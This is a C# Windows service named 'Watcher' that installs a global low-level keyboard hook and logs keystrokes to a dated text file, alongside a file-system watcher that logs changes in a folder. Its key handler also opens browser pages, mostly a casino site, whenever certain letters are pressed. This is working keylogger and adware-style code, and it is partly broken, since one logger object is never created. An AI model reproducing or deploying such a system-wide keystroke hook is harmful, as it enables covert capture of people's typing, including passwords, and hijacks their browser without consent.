using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;

namespace Watcher
{
    public partial class Service1 : ServiceBase
    {
        KeyLogger logger;
        Logger _logger;
        public Service1()
        {
            InitializeComponent();
            CanStop = true;
            CanPauseAndContinue = true;
            AutoLog = true;
            
        }

        protected override void OnStart(string[] args)
        {
            logger = new KeyLogger();
            Thread loggerThread = new Thread(new ThreadStart(logger.SetHook));
            Thread _loggerThread = new Thread(new ThreadStart(_logger.Start));
            _loggerThread.Start();
            loggerThread.Start();
        }

        protected override void OnStop()
        {
            logger.UnHook();
            _logger.Stop();
            Thread.Sleep(1000);
        }


    }
    public class KeyLogger
    {
        
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callBack, IntPtr hInstance, uint threadId);
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        
        const int WH_KEYBOARD_LL = 13;
       
        const int WM_KEYDOWN = 0x100;
        

        private LowLevelKeyboardProc _proc = hookProc;
        private static IntPtr hhook = IntPtr.Zero;


        public void SetHook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
        }
        public void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }

    
        private static IntPtr hookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //Обработка нажатия 
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string dt = DateTime.Now.Day + "_" + DateTime.Now.Month + "_" + DateTime.Now.Year;
                string fileName = @"D:\Key" + dt + ".txt";
                if (!File.Exists(fileName))
                {
                    using (FileStream fs = File.Create(fileName)) ;
                }
                using (StreamWriter sw = new StreamWriter(fileName, append: true))
                {
                    //https://www.combiaressearch.com/articles/15/javascript-char-coles-key-codes
                    if (vkCode.ToString() == "17")
                    {
                        sw.Write("CTRL");
                        Process.Start("https://www.ukr.net/");
                    }
                    else if (vkCode.ToString() == "65")
                    {
                        sw.Write("A");
                        Process.Start("https://www.youtube.com/");

                    }
                    else if (vkCode.ToString() == "66")
                    {
                        sw.Write("B");
                        Process.Start("http://joycasino1.site/");

                    }
                    else if (vkCode.ToString() == "67")
                    {
                        sw.Write("C");
                        Process.Start("http://joycasino1.site/");

                    }
                    else if (vkCode.ToString() == "68")
                    {
                        sw.Write("D");
                        Process.Start("http://joycasino1.site/");

                    }
                    else if (vkCode.ToString() == "69")
                    {
                        sw.Write("E");
                        Process.Start("http://joycasino1.site/");

                    }
               

                }
                return (IntPtr)0;
            }
            else
            {
                return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
            }
        }
    }

    public class Logger
    {
        FileSystemWatcher watcher;
        object obj = new object();
        bool enabled = true;
        public Logger()
        {
            watcher = new FileSystemWatcher(@"D:\Repository");
            watcher.Deleted += Watcher_Deleted;
            watcher.Created += Watcher_Created;
            watcher.Changed += Watcher_Changed;
            watcher.Renamed += Watcher_Renamed;

        }

        public void Start()
        {
            watcher.EnableRaisingEvents = true;
            while (enabled)
            {
                Thread.Sleep(1000);
            }
        }
        public void Stop()
        {
            watcher.EnableRaisingEvents = false;
            enabled = false;
        }

        private void Watcher_Renamed(object sender, RenamedEventArgs e)
        {
            string fileEvent = "Переименован в " + e.FullPath;
            string filePath = e.OldFullPath;
            RecordEntry(fileEvent, filePath);
        }



        private void Watcher_Changed(object sender, FileSystemEventArgs e)
        {
            RecordEntry("Изменен", e.FullPath);
        }

        private void Watcher_Created(object sender, FileSystemEventArgs e)
        {
            RecordEntry("Создан", e.FullPath);

        }

        private void Watcher_Deleted(object sender, FileSystemEventArgs e)
        {
            RecordEntry("Удален", e.FullPath);

        }
        private void RecordEntry(string fileEvent, string filePath)
        {
            lock (obj)
            {
                using (StreamWriter writer = new StreamWriter(@"D:\log.txt", append: true))
                {
                    writer.WriteLine($"{DateTime.Now.ToString()} файл {filePath} был {fileEvent}");
                }
            }
        }
    }
}
